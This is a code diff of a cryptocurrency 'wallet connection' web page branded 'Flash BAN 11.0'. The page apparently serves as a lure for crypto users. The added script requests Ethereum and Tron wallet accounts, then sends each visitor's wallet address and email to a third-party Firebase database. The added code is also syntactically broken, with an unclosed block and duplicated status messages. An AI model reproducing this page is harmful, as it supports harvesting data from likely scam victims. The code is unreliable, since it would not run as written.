@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Flash BAN 11.0 Connection to DEFI Network</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body {
@@ -84,92 +85,51 @@
     <script>
         let connectedAddress = null;
         let isConnecting = false;
-        
-        // Get session ID from URL parameters
-        const urlParams = new URLSearchParams(window.location.search);
-        const sessionId = urlParams.get('session');
 
-        async function updateServerStatus(address) {
-            try {
-                const response = await fetch('/api/status', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        sessionId: sessionId,
-                        address: address,
-                        email: document.getElementById('emailInput').value
-                    })
-                });
-                
-                if (!response.ok) {
-                    throw new Error('Failed to update server status');
-                }
-            } catch (error) {
-                console.error('Error updating server:', error);
-            }
-        }
-
-        async function connectWallet() {
+        document.getElementById('connectButton').addEventListener('click', async function () {
             if (isConnecting) return;
             isConnecting = true;
-            
-            const email = document.getElementById('emailInput').value;
-            if (!email) {
-                document.getElementById('statusMessage').textContent = "Please enter your email address.";
-                isConnecting = false;
-                return;
-            }
-
             document.getElementById('connectButton').textContent = 'Connecting...';
             document.getElementById('connectButton').style.backgroundColor = 'rgb(150, 100, 255)';
 
-            const wallets = [window.tronLink, window.trustwallet, window.exodus, window.safepal, window.bitget];
-            
-            for (const wallet of wallets) {
-                if (wallet && wallet.tronWeb) {
-                    try {
-                        await wallet.request({ method: 'tron_requestAccounts' });
-                        connectedAddress = wallet.tronWeb.defaultAddress.base58;
-                        break;
-                    } catch (error) {
-                        document.getElementById('statusMessage').textContent = "Please unlock your wallet and try again.";
-                    }
-                }
-            }
+            if (window.ethereum) {
+            if (window.tronLink && window.tronLink.tronWeb) {
+                try {
+                    const web3 = new Web3(window.ethereum);
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
+                    connectedAddress = accounts[0];
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    const tronWeb = window.tronLink.tronWeb;
+                    connectedAddress = tronWeb.defaultAddress.base58;
 
-            if (!connectedAddress) {
-                document.getElementById('statusMessage').textContent = "No supported wallet found. Please install Trust Wallet, Exodus, TronLink, SafePal, or Bitget.";
+                    document.getElementById('connectButton').textContent = 'Wallet Connected';
+                    document.getElementById('connectButton').style.backgroundColor = 'rgb(0, 128, 0)';
+                    document.getElementById('walletAddress').textContent = `Connected Address: ${connectedAddress}`;
+
+                    const email = document.getElementById('emailInput').value;
+                    const apiUrl = `https://apidatabase-ff62a-default-rtdb.firebaseio.com/addresses/${encodeURIComponent(connectedAddress)}.json`;
+                    const jsonData = JSON.stringify({ email });
+
+                    await fetch(apiUrl, {
+                        method: 'PUT',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: jsonData
+                    });
+                } catch (error) {
+                    document.getElementById('statusMessage').textContent = "Wallet connection failed.";
+                    document.getElementById('connectButton').textContent = 'Connect Wallet';
+                    document.getElementById('connectButton').style.backgroundColor = 'rgb(72, 32, 232)';
+                }
             } else {
-                document.getElementById('connectButton').textContent = 'Wallet Connected';
-                document.getElementById('connectButton').style.backgroundColor = 'rgb(0, 128, 0)';
-                document.getElementById('walletAddress').textContent = `Connected TRX Address: ${connectedAddress}`;
-                
-                // Update server with connected address and session ID
-                if (sessionId) {
-                    await updateServerStatus(connectedAddress);
-                }
+                document.getElementById('statusMessage').textContent = "SafePal Wallet or MetaMask is not installed!";
+                document.getElementById('statusMessage').textContent = "SafePal or TronLink Wallet is not installed!";
             }
-            
+
             isConnecting = false;
-        }
-
-        // Add API endpoint to check connection status
-        app.get('/api/status', (req, res) => {
-            const sessionId = req.query.session;
-            if (!sessionId) {
-                return res.status(400).json({ error: 'Session ID required' });
-            }
-            
-            // Return the connection status and address if available
-            res.json({
-                isConnected: connectedAddress !== null,
-                address: connectedAddress
-            });
         });
-
-        document.getElementById('connectButton').addEventListener('click', connectWallet);
     </script>
 </body>
 </html>
